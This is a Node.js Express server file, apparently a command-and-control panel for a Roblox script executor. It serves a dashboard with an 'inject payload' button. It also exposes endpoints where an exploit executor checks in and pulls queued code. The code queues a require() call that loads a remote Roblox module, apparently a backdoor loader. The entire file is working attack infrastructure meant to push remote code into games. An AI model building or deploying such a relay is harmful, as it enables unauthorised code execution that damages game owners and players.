// language: JavaScript, target: Node.js (Render), file: server.js
// @author: Ratman4080

const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use(express.text({ type: 'text/plain' }));

let filaScripts = [];
let robloxConectado = false;
let lastPing = 0;

// ============================================================================
// 1. INTERFACE WEB (HTML/CSS/JS)
// ============================================================================
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>C2 Control Panel</title>
        <style>
            body {
                background-color: #0d1117;
                color: #c9d1d9;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background-color: #161b22;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
                text-align: center;
                border: 1px solid #30363d;
                width: 350px;
            }
            h1 { margin-top: 0; color: #58a6ff; font-size: 24px; }
            .status-box {
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 30px;
                font-weight: bold;
                font-size: 18px;
            }
            .indicator {
                width: 15px;
                height: 15px;
                border-radius: 50%;
                margin-right: 10px;
                background-color: #f85149;
                box-shadow: 0 0 10px #f85149;
                transition: all 0.3s ease;
            }
            .indicator.online {
                background-color: #2ea043;
                box-shadow: 0 0 10px #2ea043;
            }
            button {
                background-color: #238636;
                color: white;
                border: none;
                padding: 12px 24px;
                font-size: 16px;
                border-radius: 6px;
                cursor: pointer;
                width: 100%;
                font-weight: bold;
                transition: background-color 0.2s;
            }
            button:hover { background-color: #2ea043; }
            button:disabled {
                background-color: #21262d;
                color: #8b949e;
                cursor: not-allowed;
                border: 1px solid #30363d;
            }
            .log {
                margin-top: 20px;
                font-size: 12px;
                color: #8b949e;
                min-height: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>C2 Dashboard</h1>
            
            <div class="status-box">
                <div id="indicator" class="indicator"></div>
                <span id="status-text">Roblox Offline</span>
            </div>

            <button id="inject-btn" onclick="injetar()" disabled>INJETAR PAYLOAD</button>
            <div id="log" class="log"></div>
        </div>

        <script>
            const indicator = document.getElementById('indicator');
            const statusText = document.getElementById('status-text');
            const injectBtn = document.getElementById('inject-btn');
            const logDiv = document.getElementById('log');

            // Verifica o status a cada 2 segundos
            setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const data = await res.json();
                    
                    if (data.connected) {
                        indicator.classList.add('online');
                        statusText.innerText = 'Roblox Online';
                        injectBtn.disabled = false;
                    } else {
                        indicator.classList.remove('online');
                        statusText.innerText = 'Roblox Offline';
                        injectBtn.disabled = true;
                    }
                } catch (e) {
                    statusText.innerText = 'Erro de Conexão';
                }
            }, 2000);

            // Função do botão injetar
            async function injetar() {
                injectBtn.disabled = true;
                logDiv.innerText = "Enviando comando para a fila...";
                
                try {
                    const res = await fetch('/inject', { method: 'POST' });
                    const data = await res.json();
                    
                    if (data.ok) {
                        logDiv.innerText = "Payload injetado! O Roblox vai executar em breve.";
                    } else {
                        logDiv.innerText = "Erro: " + data.erro;
                    }
                } catch (e) {
                    logDiv.innerText = "Falha ao conectar com o servidor.";
                }
                
                setTimeout(() => { injectBtn.disabled = false; logDiv.innerText = ""; }, 3000);
            }
        </script>
    </body>
    </html>
    `);
});

// ============================================================================
// 2. ROTAS DO C2
// ============================================================================

// O Executor bate aqui para avisar que está online
app.post('/roblox/conectar', (req, res) => {
    robloxConectado = true;
    lastPing = Date.now();
    console.log(`[ROBLOX] Executor conectado (IP: ${req.ip})`);
    res.json({ ok: true });
});

// O Executor bate aqui para puxar scripts
app.get('/pegar_script', (req, res) => {
    lastPing = Date.now(); // Mantém o status online
    
    if (filaScripts.length > 0) {
        const script = filaScripts.shift();
        console.log('[ROBLOX] Enviando payload da fila!');
        res.send(script);
    } else {
        res.send(''); // Fila vazia
    }
});

// A UI bate aqui quando você clica no botão
app.post('/inject', (req, res) => {
    if (!robloxConectado || (Date.now() - lastPing > 15000)) {
        return res.status(400).json({ ok: false, erro: "Roblox não está conectado." });
    }

    const payload = 'require(8038037940).CLoad("nottheunidex")';
    filaScripts.push(payload);
    
    console.log(`[INJECT] Payload enfileirado pelo Painel Web`);
    res.json({ ok: true });
});

// A UI usa isso para ver se o Roblox tá vivo
app.get('/status', (req, res) => {
    const isAlive = (Date.now() - lastPing) < 15000; // 15s de tolerância
    res.json({ connected: robloxConectado && isAlive });
});

// ============================================================================
// 3. START
// ============================================================================
app.listen(PORT, () => {
    console.log(`[SERVER] Painel rodando na porta ${PORT}`);
});
